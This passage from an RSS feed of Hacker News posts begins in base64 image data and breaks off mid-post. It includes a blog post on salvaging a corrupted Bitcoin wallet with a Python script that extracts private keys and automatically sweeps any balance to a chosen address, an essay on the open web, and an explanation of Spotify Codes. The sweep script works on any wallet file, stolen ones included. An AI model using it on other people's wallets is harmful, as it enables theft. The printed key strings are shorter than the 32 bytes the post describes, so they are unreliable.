Z2mrqGqkgG0oWyGrbmWpL2+pLi+lruFs8W2iKzFsKQHybSanJKftKPQI5SnmdolisSPsd/l5ufo6err7O3u7/Dx8vP09fZ91en59/z9/v8AAwocGGPfOYMEEypcyLChw4cQI0qcSPENwjAXK2rcyLGjx48dM+IQaYMkyJMoUwmqXMlSoMkmIQAAIfkEBQoACAAsNAAxAGwAcAAABesgIo5kWR5mqq5s675wLM90bd94ru987//AoHBILBqPyKRyyWw6n9ColIeaWq/YrHbL7Xq/4LB4TC6bz+i0es1uu99wcjVOr9vv+Lx+z+/7/4Ayc4GEhYaHiImKi4yNjo+QkZKTlJWWl5g1AAMBBgUCAwCLA54FpqYGAyODfwSnr6cEhwOwtQWqhACltqcGooG0vLC4gAHCsAKEu8emysyvhMbPn4TBz8R/us++hdbCqqx+rsKyiKS1qYub0qC/me/w8fLz9PX29/j5mOFe/Pr/AAMKHEiwYB9/OhDiUGiwocOHECNKnJiFYZMQACH5BAUKAAgALCkAMQBjAHAAAAXiICKOZFkeZqqubOu+cCzPdG3feK7vfO//wKBwSCwaj8ikcslsOp9QHCpKrVqv2Kx2y+16v+CweEwum8/otHrNbi+n7rh8Tq/b7/i8fs+HwvuAgYKDhIWGh4iJiouMjY6PkJGSk5Q/f5WYmZqbnJ2en2eXoKOkpaanqKmqq6ytegADAQYFAgMAggOzBbu7BgM5ol4EvMS8BHwDxcoFv3kAusu8Brd4ydHFzXcB18UCedDcu9/hxHnb5LR51uTZds/k03rr1+0zwTv3OcPXx325yr4EwTpXi5qrgwgTKlyIJZ+REAAh+QQFCgAGACwpACUAdgB+AAAF/6AhjmRpnmiqjsXqvnAsz3Jh3zat73zv/8CgcEgsGnFIpHHJbDqf0Kj015pandWrdst9MrqxLPj03SXP4hlauxi7l+W3HLo2o5Xz+HzP7/tdaX99gYKFhiJ6h4pWd3hviYtQbZF7kIh+dW6WlJydnp+goaKjpKWmp6ipqqusra4ym68ohCqxsgaZk7dTtru+PY04L72/xcaMx1TJcsTLziXBNy7NxrrPNJvUrJko2tff4OHi4+Tl5ufo6err7O3u7/Cl3q+0KfOpufHT+sXROfv8AtKLV09gjHsGPfkreImcNXfZnHEjk7CixYsYM2rcyLGjx48rEF5h2EXkk4lRHmVWNAnyxcJKLWMCIigTDMt4AAYEsCFgAAAeL5nxGIBmACmVQQg0IkAq4g6iwYzaSSKUB4CFP8NBjSYV3E5/AsQt/AduLMlfX6OF1bqw67er/rKyjVpO6R2m5rYicVsu59eecueEAAAh+QQFCgAHACw7ACUAZAB9AAAF/+AhjmRpnihppGzrvnDsriUt33iu73zv/8Cg8GBLFYfIpHLJbDp3x6c0F51ar9hssKplcVVQ07dLLpvPsui4tSai3/C4/NeeK+v2vH6fb+P5gIGCQ2qDhoeIiYqLjI2Oj5CRkpOUlZaXQn+WhZidnk5+n6KjPpqYpqSpqi+hq66vRmKws7S1tre4ubq7vL2+v8DBwsN3s5zEyHytycxwqJvN0YbL0tVlx9bZ2tvc3d7f4OFnAAMBBgUCAwDKSAPnBfDwBgN22DsE8fnxBKID+v8F6HUC8A5gPAPrzlCT4c+gPoGXAjjUJ6BTwYnwFDK5iFHjEokY4VXE1DAkREsEQzEiLEVnxo6SDk/isAcHn0N+o9z9m1dPFhByINMl1LFQnNEbzyolPcqUlcumUJH6jBMCACH5BAUKAAYALCcAJQB4AH0AAAX/oCGOZGmeaKqWxeq+cCzPdGHfNq3vfO//wKBwSCwaTbhk8shsOp/QqHTKa1GvTit2y+0aESSw96X1ik3nmnJdZW8P4zgvjaLL7zBAW7lf46Z2dXiDhIWGOmWHiomKjXiBJ5COd3pxfnyALpKTUHCch5CbXX5jaQiVn6mqq6ytrq+wsbKztLW2t7i5uru6prw1KqG/LqQknsNfmshNqMuXSaIj0cvU1YOM1j7Y2U/TBt7cL83Iz3/R4NzH4T/C6wbFaGHj7vT19vf4+fr7/P3+/wADChxIsKDBQwAGBLAhYMC8ddtEDPAzgB48EQSeEfg3sVxFfgDK3XjIS6SNjiI/eupbaFIAP5M3qsGcmYPaTJYiXe5D6REkTJK7YBrgSfFfxksbARK9oTLcxREJWTYEerCq1atYs2rdyrWr169ZIxYSS+UpHrNg02ozeUeo2rc7yF4jJPcs3LtH3GoDoncWWryN/lpyQ6sv4MOx6vpTjLixLMOOI7MS3CUEACH5BAUKAAYALCcALwAkACwAAAWHoCGOZGmSDXqurHqmbTwuLS23MH7vbMKXuVjwRywaj8ik0iUbLk2+o9M0/dlW12S1KkVFn+CweEwum8/otHqdBgwChYJgAAgP4nj84EnI+wsESnd/fntHAISESIOJeYZFcI15AkeSf5WWeUeRmZRGjJaPRIiZBUmgiaJGfY2BS6h6YW6Rc08hADs="></p></div> </article></div></div></div>]]>
            </description>
            <link>https://historycollection.com/conspiracy-8-far-fetched-theories-turned-true/7/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25156405</guid>
            <pubDate>Fri, 20 Nov 2020 01:16:33 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Corrupted Bitcoin Wallet and 30 Lines of Code = 3000 USD]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25156310">thread link</a>) | @kewde__
<br/>
November 19, 2020 | https://kewde.github.io/corrupted-bitcoin-wallet | <a href="https://web.archive.org/web/*/https://kewde.github.io/corrupted-bitcoin-wallet">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

<p>A friend of a relative had brought in their Macbook Air, and kindly asked me to repair it.
This required me to download the latest MacOS for which I didn’t have enough space for.
In a desperate attempt, I decided to clean up my external hard drive, removing files that were taking up too much storage.</p>

<p>This is the exact moment that karma had found its way to my 4 AM adventure to fix this MacBook.</p>

<p>To my surprise I found a folder named “Btc”, where I stored episode of television shows. 
Apparently it has been there since 2015 - this must have been my very first wallet!</p>

<p>Sadly, the wallet wouldn’t open in bitcoin core, it has been corrupted.
The <code>db.log</code> outputs the logs for the BerkeleyDB wallet file, it indicated the following error message:</p>
<pre><code>file wallet.dat has LSN 780/2077553, past end of log at 1/333
Commonly caused by moving a database from one database environment
to another without clearing the database LSNs, or by removing all of
the log files from a database environment
DB_ENV-&gt;log_flush: LSN of 780/2077553 past current end-of-log of 1/333
Database environment corrupt; the wrong log files may have been removed or incompatible database files imported from another environment
</code></pre>

<p>Therefore I was forced to salvage the wallet somehow.
The <code>Bitcoin Core</code> software has an option <code>-salvagewallet</code> which did not appear to help.</p>

<p>A bit of googling around and I found out that uncompressed private keys are prepended with <code>01 01 04 20</code>.
Time to take a quick scroll through the file in <code>HxD</code>, a popular hex editor!</p>

<p><img src="https://kewde.github.io/res/corrupted-bitcoin-wallet/HxD-search.png" alt=""></p>

<p><img src="https://kewde.github.io/res/corrupted-bitcoin-wallet/HxD-search-2.png" alt=""></p>

<p>I didn’t expect to get 145 hits, but what I certainly didn’t want to do was manually converting all of those hits to private keys and checking the balance.</p>

<p><img src="https://kewde.github.io/res/corrupted-bitcoin-wallet/HxD-search-3.png" alt=""></p>

<p>The private key is 32 bytes long and is just after our prefix.</p>
<pre><code>ffb2b2ed484fa1d5c9b2f4ad8e7ec696
</code></pre>

<p>So I got to work, the result is below.</p>


<pre><code>pip install bit
</code></pre>

<p>Take the code below and put in a file named <code>salvage.py</code>
<strong>Do not forget to uncomment and change the address variable on line 7</strong>.</p>

<p>Finally, run the script!</p>
<pre><code>python salvage.py
</code></pre>

<p>It will output something like this, and if it finds funds, will automatically transfer them over to the address your specified.
PS: do not post this publicly, the first string is the <code>private key</code>, followed by the <code>address</code> and finally the <code>amount of btc</code>.</p>
<pre><code>91236845f793a1aabd01c1d9fe615b8b 14uxHyEs1rKcPTYxnxMFW9soVTgvQsGvZq 0
323a961695929abf201386aaf2187e1 1tEiRCzpR4fKzvTejZV3MJhymx1iDmHNd 0
f94048834d85608f3a822aa84799fb8f 1JgH79RGzm9QwbYKU8LSs1hiDHsNdvrhR 0
365480736196084e8d6c7bf7b5a5943d 16CUqJjUEpkE7n34UKjTGBn5ZWAC1EGbep 0
636c0638ff10d8d19e9f36b5bed1e06 1MefrcgGg8cuSRSFbjxBwMsid6FAXf2FNb 0
aba4471c95f8217c3bbfdfddde4e17c0 1GfuKWVfk9jcu9hoNekP8DxCu2AUvDWsH3 0
a46802436a1722a0494ea88c391e2358 1CZ1LepDyk4rbD9tbYpUW1fpCJfjGuWb9J 0
23cf4f0d928d0cbcb3791ff659d81ed7 1KvCXp43MxHZGA1uAZeL1qEww8Zvx7syHd 0
d9310b543473af26aaab9e7400b4070 1B1z1GDyUPCg63NwPr4JRNg9omrHnmtcgW 0
b19a010122ce93ced3f5889109e5af99 1HDs9h8SwZn95kBTU3VWZqRfcs1ZBUe8de 0
12fd6615262cb26dc7ef8b1b7be27b8f 1E3HW9Bb6GiD9d79oJsMZB52j9dXshmhzv 0
19cad87841864304a23812a893c8dfe0 18gxN33f8KYGWH9NxrJo1FBkAVq4L2im9B 0
2ede1602dc2a0574c72342362a2c446c 1C4hCdQhy1yEvRWv2qNVJkNmz61bfCPNAZ 0
a3b68584e2d9350e349a29afa555cf2b 16icLfzH2JPrzWEyNzw8Y7FRR2uUH68fG2 0
8f9fa69c9c4098ed98c7ec805131fd4f 1CZfJ3gfvfwPcfesKPxCTJo6PGAw5a4wFS 0
2d022112ea9d6710d08fcb4c695af606 1BSuQypnh14EFhZfqRVN9djjsU7yKSuEhQ 0
da406f8761d993d7138ee75b10e7600b 1LxAr1SBFmbQZacinq5qZhPSghM1Ncq33W 0
8ac6891b9ad67f860e258e82fe24aeaa 18UCnSmxLkjx6vQWULzEVX3wDyEojiFybr 0
54a005c84d9653e19771494c82360861 18VUZhJu5nSuP8ovJDejaVTrYZLaSL4q68 0
9c71627b14ac35b7a0b26dd316c4a324 1HyHdi6suCYDxMPo4vwio55KksHz34Pok4 0
daa514c0f215cb9ac314e47c214be022 1PNMuWtNoi5qdkNRW7P8Wg8b4SBuQxheiZ 0
c0292135b0df7fe7c11d2a76c3ae288b 1F4fEjExUneyDZxjHqRWofpBDf8yTiPyeJ 0
9baf68164b9b14dc1c9c10e49639fcfc 1BrKyAzwTBdVhjZgK4xqi7ZUMWKSD9jdSs 0
7f28390b03957683423956ad890bd0d8 1MbQauBHGR1JWeo9UdP49xaqYVcFP73Fw9 0
</code></pre>


<pre><code>from bit import Key
from bit.format import bytes_to_wif
import re

wallet_file = "wallet.dat"
# Uncomment for security, set the address and uncomment.
#address = "ADDRESS_TO_SEND_TO"

def salvage(priv):
    key = Key.from_hex(priv)
    wif = bytes_to_wif(key.to_bytes(), compressed=False)
    key = Key(wif)
    print(priv + " " + key.address + " " + str(key.get_balance('btc')))
    if (float(key.get_balance('btc')) &gt; 0):
        tx = key.send([], leftover=address)
    return key

with open(wallet_file, "rb") as f:
    matches = re.findall(b'\x01\x01\x04\x20(.{32})', f.read())

for priv in matches:
    salvage(priv.hex())
</code></pre>


<p>In retrospect, I could’ve used PyWallet but I decided not to.</p>

<h2 id="stricter-validation">Stricter validation</h2>
<p>The PyWallet implementation does a lot more checks before it decides that a key is “valid”.
It seems to be using a concept of both “prefixes” and “suffixes” for the keys.
Additionally the prefix used in <code>PyWallet</code> is a lot larger, <code>308201130201010420</code> instead of <code>01010420</code>.
If by any chance a single character of the prefix and/or suffix get corrupted, it will not detect it as a key.
My approach is more aggressive in the sense that it will attempt anything that might look like a key.</p>

<h2 id="unencrypted-wallet">Unencrypted wallet</h2>
<p>Additionally, my wallet was not encrypted, therefore it was a bit overkill to use PyWallet.</p>

<h2 id="the-real-reason">The real reason</h2>
<p>I was ony my Windows machine and I didn’t feel like spending an hour to install dependencies like <code>python-twisted</code>, when I could get the job done with less code.</p>

<p>Nonetheless, PyWallet is a great tool and it is worth using for encrypted wallets.</p>
</div></div>]]>
            </description>
            <link>https://kewde.github.io/corrupted-bitcoin-wallet</link>
            <guid isPermaLink="false">hacker-news-small-sites-25156310</guid>
            <pubDate>Fri, 20 Nov 2020 01:02:22 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How user experience degrades as the open web dies]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25156304">thread link</a>) | @abhinavsharma
<br/>
November 19, 2020 | https://insightbrowser.com/blog/open-web-dying-why-care | <a href="https://web.archive.org/web/*/https://insightbrowser.com/blog/open-web-dying-why-care">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content"><div><div><p><em>Part 1: How your user experience changes for the worse as the open web gives way to walled gardens</em></p><p>I hang out in two circles. Open web enthusiasts that are lamenting its demise, and regular users who are happy with their fast snappy apps and couldn't care less. </p><p>These groups have a hard time talking because the "open web" too often comes across as an idealistic abstract notion and most end users just don't tangibly feel the bad consequences. In fact, they're often happier with the snappy, vertically integrated experience of closed app ecosystems. </p><p>My goal here is to make it more palpable how everyday apps, searches and tools get worse when we let big centralized companies take over the web, and explore some paths for reversing it.</p><h2>What is the the open web?</h2><p>Most definitions of the "open web" I've seen are either too technical to be accessible or too abstract to be usable and getting gridlocked in this debate often means watching from the sidelines while actual user welfare slowly diminishes.</p><p>Three characteristics that proponents of the open web will agree to in roughly descending order are:</p><ul><li><strong>Ease of publishing</strong>: anyone can publish to it freely or at least very cheaply, and is on the same footing with a globally accessible URL</li><li><strong>Ease of consuming</strong>: Net neutrality — ISP's dont cut deals with corporations to make some websites load faster or cheaper than others.</li><li><strong>Ease of remixing</strong>. You can see the source code. Content licenses and tools are permissive for derived works.</li></ul><h2>Detour: A framework to break down how people use the web</h2><p>I want to focus on the user experience point of view. To do this, I'm going to introduce a framework that divides up all our internet usage into two categories.</p><p><img src="https://landen.imgix.net/blog_uSsTzKptQlxlvUvQ/assets/xscGdbWOOPkGjdER.png" alt="Frame 1.png"></p><h3><strong>Unfamiliar problems</strong></h3><p>You have an unfamiliar problem and to solve it you either need to learn something new, or purchase goods or services to solve it</p><ul><li>e.g. taking out a mortgage, a health problem in the family, where to go to college, what skill to acquire next.</li><li>Unfamiliar problems are solved in large part with acquiring new knowledge, not just products or services.</li><li>These user journeys start with search engines — Google predominantly and **a lot of the time solving them is spent on web pages**.</li><li>When people are looking to solve unfamiliar problems, **revenue is typically higher-margin**, because users can't price the products and services as well.</li><li>These ultimately transition to being familiar problems.</li></ul><h3><strong>Familiar problems</strong></h3><ul><li>e.g. being entertained, keeping the dog food in stock,</li><li>These are best solved with apps like Email, Netflix, Twitter, DTC subscription boxes, etc.</li><li>Solving these needs has a very well defined user interaction journey. You open the app you're familiar with and follow its standard flow.</li><li>Revenue from people solving familiar problems is typically lower-margin and there's more competing products.
</li></ul><h3>How we're spending our time on familiar vs. unfamiliar problems</h3><p>Using time spent in apps vs mobile web on mobile is a way to proxy how we divide up our time.<strong> We spend most of our time on familiar problems but have a constant trickle of unfamiliar problems</strong>.</p><p><img src="https://landen.imgix.net/blog_uSsTzKptQlxlvUvQ/assets/cPuXkKFELALeIAkI.png" alt="Untitled (1).png"></p><h2>Unfamiliar problems are better solved with the open web</h2><p>Think about the last time you did some research, e.g. choosing a phone plan. You asked your friends, compared on forums, looked at the official sites, scribbled some notes and made a decision. Even if this journey was quick, you likely traversed a dozen services and products to do this.</p><p>Unfamiliar problems have less constraints, require creativity to solve, and thus are better suited to open solutions. Some other things that work for the open web here</p><ul><li>comparing alternatives is easier.</li><li>changing modalities (e.g. from reading to video) is easier.</li></ul><h2>Familiar problems stand to benefit more from tight vertical integration</h2><p>Take Spotify for example. It solves the very familiar problem of listening to music. Spotify just works better as an app because</p><ul><li>Controlling the user experience end to end makes for smoother flows.</li><li>Having all the user data kept with Spotify allows for better recommendation algorithms.</li><li>Spotify can easily hand off between devices.</li><li>It can run in the background</li></ul><p>Sure, the web can do a bunch of these things, but they're simply not first-class considerations in the open-read-close workflow that the browser was designed for.</p><h2>But the open web can be better for familiar problems too, especially for breaking monopolies</h2><p>Let's look at Amazon. Initially you start buying there because of their "always low prices" and the convenience of 2 day shipping. Over the years you keep shopping there, until you've forgotten that </p><ol><li>free 2 day shipping is now near universal</li><li>amazon isn't often the cheapest place</li></ol><p>On the Amazon app, you see the story around the product that best serves Amazon, not the buyer. Meanwhile, over on Insight you can use the web version and do all these things the app can't.</p><p><img src="https://landen.imgix.net/blog_uSsTzKptQlxlvUvQ/assets/ZEblynrLvBsutnlQ.png" alt="Screen Shot 2020-11-17 at 5.42.21 PM.png"></p><p>... and not just that

</p><p><img src="https://landen.imgix.net/blog_uSsTzKptQlxlvUvQ/assets/JVZoTRazmYPZXBQQ.png" alt="Screen Shot 2020-11-17 at 5.59.22 PM.png"></p><h2><strong>How solving unfamiliar problems gets harder too</strong></h2><p>Unfamiliar problems are solved in large part with acquiring new knowledge, not just products or services. The incentives to freely create knowledge that solves unfamiliar problems is lost as the web closes down.</p><ul><li>Google increasingly takes a larger percent of ad revenue as they <a href="https://sparktoro.com/blog/less-than-half-of-google-searches-now-result-in-a-click/">start extracting answers from pages and showing them on their search result pages.</a><a href="https://sparktoro.com/blog/less-than-half-of-google-searches-now-result-in-a-click/"></a></li><li><a href="https://sparktoro.com/blog/less-than-half-of-google-searches-now-result-in-a-click/"></a>Publishers have to either a) paywall their content (e.g. NYTimes) or b) subtly sell products (everyone standing a Wirecutter alternative), or c) ask for donations in order to survive.</li><li>Only a few big name publishers survive. Google and Facebook start sending them more of the traffic that's left, and since domain rank plays a big part in Google's ranking, those that survived assimilate more power and rank better.</li><li>and search engines seem more littered with SEO junk and less actually useful information year over year.</li></ul><h2>In conclusion, and where we fit in.</h2><p>And that's how your user experience slowly degrades, and that's why we stand to suffer as users if we give up the ability to remix software that the web brought us and closed apps are now taking away. </p><p>Our goal with Insight is to give the web (in particular on mobile) a fighting chance by exhibiting how it can be more powerful than a closed ecosystem and give more control to the end-user. We do this by showcasing the web's infinite extensibility and customizability for common use cases like <a href="http://insightbrowser.com/collections/search">search</a>, <a href="https://insightbrowser.com/collections/shopping">shopping</a>, <a href="https://insightbrowser.com/collections/reading">reading</a> and <a href="https://insightbrowser.com/collections/cooking">cooking</a>.</p><p>Insight's advanced features will soon only be available to Pro subscription users but for a limited time we're opening up <strong>lifetime free beta access if you download it via TestFlight below.</strong></p><h3>Coming up in part 2</h3><ul><li>What parts of the open web probably should die off?</li><li>A pragmatic path for what's left of the open web to thrive again.</li></ul><p>We'd love to hear from you, feel free to tweet at or DM us at @<a href="https://twitter.com/insightbrowser">insightbrowser</a> </p></div></div></div></div>]]>
            </description>
            <link>https://insightbrowser.com/blog/open-web-dying-why-care</link>
            <guid isPermaLink="false">hacker-news-small-sites-25156304</guid>
            <pubDate>Fri, 20 Nov 2020 01:01:39 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How do Spotify Codes work?]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25156104">thread link</a>) | @Mistri
<br/>
November 19, 2020 | https://boonepeter.github.io/posts/2020-11-10-spotify-codes/ | <a href="https://web.archive.org/web/*/https://boonepeter.github.io/posts/2020-11-10-spotify-codes/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><article><div><p><img src="https://boonepeter.github.io/imgs/spotify/spotify_track_6vQN2a9QSgWcm74KEZYfDL.jpg" alt="Spotify barcode"></p><p><a href="https://www.spotifycodes.com/">Spotify Codes</a> are QR-like codes that can be generated to easily share Spotify songs, artists, playlists, and users. I set out to figure out how they worked, which lead me on a winding journey through barcode history, patents, packet sniffing, error correction, and Gray tables.</p><h2 id="spotify-uris">Spotify URIs</h2><p>Let’s start with Spotify URIs (Uniform Resource Identifiers). Different pieces of media (artists, albums, songs, playlists, users) all have a URI.</p><p>The ABBA song “Take a Chance on Me” has this URI:</p><p><code>spotify:track:6vQN2a9QSgWcm74KEZYfDL</code>.</p><p>The ABBA Album “The Album” has the following URI:</p><p><code>spotify:album:5GwbPSgiTECzQiE6u7s0ZN</code></p><p>As you can see, the URIs can be broken up into components:</p><p><code>spotify:&lt;media type&gt;:&lt;22 characters&gt;</code>.</p><p>The 22 characters are the numbers 0-9, characters a-z and A-Z. This means there are <code>10 + 26 + 26 = 62</code> possibilities for each character (almost <a href="https://en.wikipedia.org/wiki/Base64">Base64</a>). So the potential number of Spotify URIs is <code>62^22</code> which is equal to <code>2.7e39</code> or</p><div><pre><code data-lang="python"><span>2</span>,<span>707</span>,<span>803</span>,<span>647</span>,<span>802</span>,<span>660</span>,<span>400</span>,<span>290</span>,<span>261</span>,<span>537</span>,<span>185</span>,<span>326</span>,<span>956</span>,<span>544</span>
</code></pre></div><p>To illustrate that number:</p><div><pre><code data-lang="python">x <span>=</span> <span>62</span> <span>**</span> <span>22</span>
<span># the number of milliseconds in a year</span>
x <span>//=</span> <span>365</span> <span>*</span> <span>24</span> <span>*</span> <span>60</span> <span>*</span> <span>60</span> <span>*</span> <span>1000</span>
<span># the number of words in the bible (about 1 million)</span>
x <span>//=</span> <span>1000000</span>
</code></pre></div><p>If Spotify printed a whole Bible’s worth of URIs every millisecond they could do this for <code>85,863,890,404,701,306,452,633</code> years. Safe to say Spotify is not going to run out of URIs anytime soon.</p><h2 id="barcode-background">Barcode background</h2><p>The <a href="https://en.wikipedia.org/wiki/Barcode">history of barcodes</a> is quite extensive. Information is encoded into different barcodes in a variety of ways.</p><p>A lot of barcodes encode data in the <strong>widths</strong> of vertical bars. Universal product codes (UPCs) encode 12 digits using combinations of vertical bars of different widths:</p><p><img src="https://boonepeter.github.io/imgs/spotify/upc.png" alt="UPC encodings"></p><p><a href="https://en.wikipedia.org/wiki/KarTrak">Another barcode</a> uses colors to encode data:</p><p><img src="https://boonepeter.github.io/imgs/spotify/KarTrak_ACI_codes.svg.png" alt="Kartrack barcode"></p><p><a href="https://en.wikipedia.org/wiki/QR_code">QR codes</a> use a 2d matrix of dots to encode data.</p><p><img src="https://boonepeter.github.io/imgs/spotify/qr_code.png" alt="QR code"></p><p>A lot of mail barcodes encode data using the <strong>height</strong> of the bars (like the <a href="https://en.wikipedia.org/wiki/Intelligent_Mail_barcode">Intelligent Mail barcode</a>).</p><p><img src="https://boonepeter.github.io/imgs/spotify/intelligent_mail_barcode.png" alt="Intelligent mail barcode"></p><h2 id="spotify-codes">Spotify Codes</h2><p>Spotify codes work like the <a href="https://en.wikipedia.org/wiki/Intelligent_Mail_barcode">Intelligent Mail Barcode</a>. Information can be stored in the bars by setting them to different heights.</p><p>This is the Spotify code for the ABBA song “Take a Chance on Me”:</p><p><img src="https://boonepeter.github.io/imgs/spotify/spotify_track_6vQN2a9QSgWcm74KEZYfDL.jpg" alt="Spotify barcode"></p><p>When the bars are sorted by height you can see that there are 8 discrete heights that they fall into.</p><p><img src="https://boonepeter.github.io/imgs/spotify/sorted.png" alt="Spotify sorted barcodes"></p><p>This means the data is encoded in <a href="https://en.wikipedia.org/wiki/Octal">octal</a>.</p><p>The Spotify logo’s diameter is the same as the height of the highest bar. This makes it easy to generate ratios of the bars' heights.</p><p>In this function I use <a href="https://scikit-image.org/">scikit-image</a> to calculate the sequence of bar heights from a logo.</p><div><pre><code data-lang="python"><span>from</span> skimage <span>import</span> io
<span>from</span> skimage.measure <span>import</span> label, regionprops
<span>from</span> skimage.filters <span>import</span> threshold_otsu
<span>from</span> skimage.color <span>import</span> rgb2gray


<span>def</span> <span>get_heights</span>(filename: str) <span>-&gt;</span> list:
    <span>"""Open an image and return a list of the bar heights.
</span><span>    """</span>
    <span># convert to grayscale, then binary</span>
    image <span>=</span> io<span>.</span>imread(filename)
    im <span>=</span> rgb2gray(image)
    binary_im <span>=</span> im <span>&gt;</span> threshold_otsu(im)

    <span># label connected regions as objects</span>
    labeled <span>=</span> label(binary_im)

    <span># get the dimensions and positions of bounding box around objects</span>
    bar_dimensions <span>=</span> [r<span>.</span>bbox <span>for</span> r <span>in</span> regionprops(labeled)]

    <span># sort by X</span>
    bar_dimensions<span>.</span>sort(key<span>=</span><span>lambda</span> x: x[<span>1</span>], reverse<span>=</span>False)

    <span># the first object (spotify logo) is the max height of the bars</span>
    logo <span>=</span> bar_dimensions[<span>0</span>]
    max_height <span>=</span> logo[<span>2</span>] <span>-</span> logo[<span>0</span>]
    sequence <span>=</span> []
    <span>for</span> bar <span>in</span> bar_dimensions[<span>1</span>:]:
        height <span>=</span> bar[<span>2</span>] <span>-</span> bar[<span>0</span>]
        ratio <span>=</span> height <span>/</span> max_height
        <span># multiply by 8 to get an octal integer</span>
        ratio <span>*=</span> <span>8</span>
        ratio <span>//=</span> <span>1</span>
        <span># convert to integer (and make 0 based)</span>
        sequence<span>.</span>append(int(ratio <span>-</span> <span>1</span>))
    <span>return</span> sequence
</code></pre></div><p>This is the sequence of the “Take On Me” Spotify code:</p><div><pre><code data-lang="python"><span>&gt;&gt;&gt;</span> get_heights(<span>"/imgs/spotify/spotify_track_6vQN2a9QSgWcm74KEZYfDL.jpg"</span>)
[<span>0</span>, <span>5</span>, <span>1</span>, <span>2</span>, <span>0</span>, <span>6</span>, <span>4</span>, <span>3</span>, <span>7</span>, <span>1</span>, <span>6</span>, <span>7</span>, <span>7</span>, <span>7</span>, <span>7</span>, <span>3</span>, <span>1</span>, <span>6</span>, <span>3</span>, <span>7</span>, <span>0</span>, <span>7</span>, <span>0</span>]
</code></pre></div><p>Here are those results overlaid on the barcode:</p><p><img src="https://boonepeter.github.io/imgs/spotify/spotify_labeled.png" alt="labeled spotify code"></p><p>After looking at a few barcodes, I realized that the first and last bars are always 0, and the 12th bar is always a 7. This must help in identifying if the barcode is valid. Having the 12th bar as the max height also helps you calculate the ratios of the bar heights. I suspect setting the first and last bar set to 0 is an aesthetic choice: it makes the barcode look more like a sound wave. Here are a few barcodes printed out so you can see that the first and last are always equal to 0 and the 12th is equal to 7.</p><div><pre><code data-lang="python">    [<span>0</span>, <span>3</span>, <span>3</span>, <span>0</span>, <span>5</span>, <span>2</span>, <span>2</span>, <span>2</span>, <span>2</span>, <span>5</span>, <span>1</span>, <span>7</span>, <span>0</span>, <span>0</span>, <span>5</span>, <span>6</span>, <span>0</span>, <span>7</span>, <span>7</span>, <span>7</span>, <span>1</span>, <span>5</span>, <span>0</span>]
    [<span>0</span>, <span>5</span>, <span>6</span>, <span>5</span>, <span>3</span>, <span>5</span>, <span>4</span>, <span>2</span>, <span>7</span>, <span>2</span>, <span>5</span>, <span>7</span>, <span>1</span>, <span>3</span>, <span>1</span>, <span>1</span>, <span>6</span>, <span>1</span>, <span>1</span>, <span>6</span>, <span>7</span>, <span>6</span>, <span>0</span>]
    [<span>0</span>, <span>4</span>, <span>6</span>, <span>6</span>, <span>6</span>, <span>4</span>, <span>4</span>, <span>1</span>, <span>6</span>, <span>6</span>, <span>6</span>, <span>7</span>, <span>7</span>, <span>3</span>, <span>6</span>, <span>0</span>, <span>7</span>, <span>6</span>, <span>0</span>, <span>2</span>, <span>1</span>, <span>7</span>, <span>0</span>]
    [<span>0</span>, <span>0</span>, <span>3</span>, <span>3</span>, <span>7</span>, <span>5</span>, <span>2</span>, <span>3</span>, <span>1</span>, <span>1</span>, <span>4</span>, <span>7</span>, <span>5</span>, <span>5</span>, <span>5</span>, <span>3</span>, <span>3</span>, <span>7</span>, <span>5</span>, <span>1</span>, <span>4</span>, <span>3</span>, <span>0</span>]
    [<span>0</span>, <span>6</span>, <span>2</span>, <span>2</span>, <span>1</span>, <span>5</span>, <span>2</span>, <span>6</span>, <span>2</span>, <span>2</span>, <span>3</span>, <span>7</span>, <span>7</span>, <span>6</span>, <span>6</span>, <span>4</span>, <span>5</span>, <span>6</span>, <span>0</span>, <span>1</span>, <span>4</span>, <span>3</span>, <span>0</span>]
    [<span>0</span>, <span>7</span>, <span>7</span>, <span>1</span>, <span>4</span>, <span>7</span>, <span>1</span>, <span>0</span>, <span>4</span>, <span>7</span>, <span>1</span>, <span>7</span>, <span>6</span>, <span>5</span>, <span>6</span>, <span>3</span>, <span>1</span>, <span>6</span>, <span>4</span>, <span>4</span>, <span>7</span>, <span>7</span>, <span>0</span>]
    [<span>0</span>, <span>1</span>, <span>1</span>, <span>1</span>, <span>5</span>, <span>7</span>, <span>1</span>, <span>3</span>, <span>3</span>, <span>1</span>, <span>0</span>, <span>7</span>, <span>7</span>, <span>0</span>, <span>7</span>, <span>3</span>, <span>2</span>, <span>3</span>, <span>0</span>, <span>6</span>, <span>0</span>, <span>0</span>, <span>0</span>]
    [<span>0</span>, <span>7</span>, <span>6</span>, <span>6</span>, <span>7</span>, <span>4</span>, <span>4</span>, <span>6</span>, <span>7</span>, <span>0</span>, <span>6</span>, <span>7</span>, <span>0</span>, <span>4</span>, <span>1</span>, <span>7</span>, <span>3</span>, <span>2</span>, <span>0</span>, <span>5</span>, <span>4</span>, <span>7</span>, <span>0</span>]
    [<span>0</span>, <span>0</span>, <span>0</span>, <span>6</span>, <span>1</span>, <span>3</span>, <span>3</span>, <span>2</span>, <span>2</span>, <span>0</span>, <span>2</span>, <span>7</span>, <span>3</span>, <span>2</span>, <span>4</span>, <span>1</span>, <span>6</span>, <span>0</span>, <span>1</span>, <span>5</span>, <span>0</span>, <span>4</span>, <span>0</span>]
